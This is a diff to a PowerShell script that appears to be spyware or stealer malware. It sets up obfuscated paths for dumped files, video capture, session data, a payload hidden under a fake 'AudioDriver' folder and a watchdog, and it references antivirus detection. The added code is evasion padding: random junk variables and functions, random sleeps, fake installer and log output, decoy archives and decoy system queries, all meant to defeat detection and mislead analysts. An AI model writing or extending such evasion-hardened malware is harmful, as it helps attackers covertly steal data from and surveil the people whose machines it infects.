@@ -1,12 +1,97 @@
-$tempDir = "$env:TEMP\$(DoubleObfuscate('system_cache',$key))"
-$fileDumpDir = "$tempDir\$(DoubleObfuscate('files',$key))"
-$videoSubDir = "$tempDir\$(DoubleObfuscate('video',$key))"
-$logPath = "$tempDir\$(DoubleObfuscate('log.json',$key))"
-$macroInputPath = "$tempDir\$(DoubleObfuscate('macroInput.txt',$key))"
-$mainPath = "$env:APPDATA\Microsoft\Windows\$(DoubleObfuscate('system_cache',$key))"
-$scriptPath = "$env:APPDATA\AudioDriver\$(DoubleObfuscate('A.ps1',$key))"
-$watchdogPath = "$env:APPDATA\AudioDriver\$(DoubleObfuscate('watchdog.ps1',$key))"
-$sessionDataDir = "$env:USERPROFILE\$(DoubleObfuscate('sessionData',$key))"
+$key = Get-Random -Minimum 1 -Maximum 255
+function o($s){ DoubleObfuscate($s,$key) }
+function d($s){ DoubleDeobfuscate($s,$key) }
+
+$tempDir = "$env:TEMP\$(o('system_cache'))"
+$fileDumpDir = "$tempDir\$(o('files'))"
+$videoSubDir = "$tempDir\$(o('video'))"
+$logPath = "$tempDir\$(o('log.json'))"
+$macroInputPath = "$tempDir\$(o('macroInput.txt'))"
+$mainPath = "$env:APPDATA\Microsoft\Windows\$(o('system_cache'))"
+$scriptPath = "$env:APPDATA\AudioDriver\$(o('A.ps1'))"
+$watchdogPath = "$env:APPDATA\AudioDriver\$(o('watchdog.ps1'))"
+$sessionDataDir = "$env:USERPROFILE\$(o('sessionData'))"
+
+function j{for($i=0;$i -lt (Get-Random -Minimum 2 -Maximum 7);$i++){Set-Variable -Name ("v"+[guid]::NewGuid().Guid.Substring(0,8)) -Value ([guid]::NewGuid().ToString()+(Get-Random));Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)}}
+j
+
+for($i=0;$i -lt (Get-Random -Minimum 2 -Maximum 7);$i++){
+    $v="junk"+[guid]::NewGuid().Guid.Substring(0,8)
+    Set-Variable -Name $v -Value ([guid]::NewGuid().ToString()+(Get-Random))
+    if((Get-Random)%2-eq 0){Write-Output ("Fake log: "+(Get-Date))}
+    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)
+}
+if((Get-Random)%3-eq 0){
+    $a=Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8)+".zip")
+    Set-Content -Path $a -Value "PK" -Encoding ASCII
+    Write-Output "Fake archive: $a"
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)
+}
+if((Get-Random)%4-eq 0){
+    Write-Output "Fake installer started..."
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    Write-Output "Fake install complete."
+}
+if((Get-Random)%2-eq 0){
+    Write-Output "Fake system check..."
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
+    Write-Output "Fake system OK."
+}
+for($i=0;$i -lt (Get-Random -Minimum 1 -Maximum 3);$i++){
+    Write-Output "Fake user click: Button"+(Get-Random -Minimum 1 -Maximum 5)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 150)
+}
+
+if ((Get-Random) % 2 -eq 0) {
+    Get-Process | Select-Object -First 1 | Out-Null
+    Get-Service | Select-Object -First 1 | Out-Null
+    Get-Date | Out-Null
+    Get-ChildItem $env:TEMP | Select-Object -First 1 | Out-Null
+}
+if ((Get-Random) % 3 -eq 0) {
+    try {
+        Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" | Out-Null
+    } catch {}
+}
+if ((Get-Random) % 4 -eq 0) {
+    try {
+        Test-Connection -ComputerName "localhost" -Count 1 -Quiet | Out-Null
+    } catch {}
+}
+if ((Get-Random) % 2 -eq 0) {
+    try {
+        Get-WmiObject Win32_OperatingSystem | Select-Object -First 1 | Out-Null
+    } catch {}
+}
+if ((Get-Random) % 3 -eq 0) {
+    try {
+        $comObj = New-Object -ComObject "Scripting.FileSystemObject"
+        $comObj.GetDrive($env:SystemDrive) | Out-Null
+    } catch {}
+}
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    $dummy = [math]::Sqrt((Get-Random -Minimum 1000 -Maximum 9999))
+    $envDummy = $env:USERNAME + $env:COMPUTERNAME
+}
+
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 6); $i++) {
+    $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
+    Set-Variable -Name $junkVar -Value ("JUNK" + [guid]::NewGuid().ToString() + (Get-Random))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)
+}
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
+    Set-Item -Path "function:$fname" -Value { param($x) return ($x + (Get-Random -Minimum 1 -Maximum 100)) }
+}
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    $junkFile = Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
+    Set-Content -Path $junkFile -Value ("JUNK" + [guid]::NewGuid().ToString()) -Encoding ASCII
+}
+
+if ((Get-Random) % 2 -eq 0) {
+    Write-Output ("Fake log: " + (Get-Date))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
+}
 
 function Use-UrlDecoder($base64) {
     return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
@@ -534,6 +619,7 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 6); $i++) {
     $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
     Set-Variable -Name $junkVar -Value ("JUNK" + [guid]::NewGuid().ToString() + (Get-Random))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)
 }
 for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
     $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
@@ -564,6 +650,27 @@ function Invoke-AVDetection {
         }
         "noop" { Write-Output "No operation performed." }
     }
+}
+
+if ((Get-Random) % 3 -eq 0) {
+    $archivePath = Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8) + ".zip")
+    Set-Content -Path $archivePath -Value "PK" -Encoding ASCII
+    Write-Output "Fake archive created: $archivePath"
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)
+}
+if ((Get-Random) % 4 -eq 0) {
+    Write-Output "Starting fake installer..."
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    Write-Output "Installation complete."
+}
+if ((Get-Random) % 2 -eq 0) {
+    Write-Output "Checking system requirements..."
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
+    Write-Output "System requirements met."
+}
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    Write-Output "User clicked: Button" + (Get-Random -Minimum 1 -Maximum 5)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 150)
 }
 
 try {
